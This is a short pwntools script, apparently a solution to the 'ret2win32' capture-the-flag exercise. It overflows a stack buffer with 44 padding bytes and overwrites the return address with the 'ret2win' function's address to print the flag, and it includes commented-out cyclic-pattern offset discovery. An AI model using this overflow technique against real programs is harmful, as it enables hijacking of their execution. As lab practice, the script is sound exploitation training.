from pwn import *
context.local(log_level='debug')

elf = ELF("./ret2win32")
p = process('./ret2win32')
#print(p.recv())
offset = 44
eip = pack(elf.sym['ret2win'],32)
payload = b'A' * offset + eip

'''find eip_offset
g = cyclic_gen()
t = g.get(offset)
print(p.recv())
p.sendline(t)
print(p.recv())
eip_t = '0x6c616161'
eip_t = bytes.fromhex(eip_t[2:]).decode()
print(eip_t) 
print(g.find('laaa'))
'''
p.recv()
p.sendline(payload)
p.recv()
#print(p.recv())
log.success(f'flag: {p.recv().decode()}')


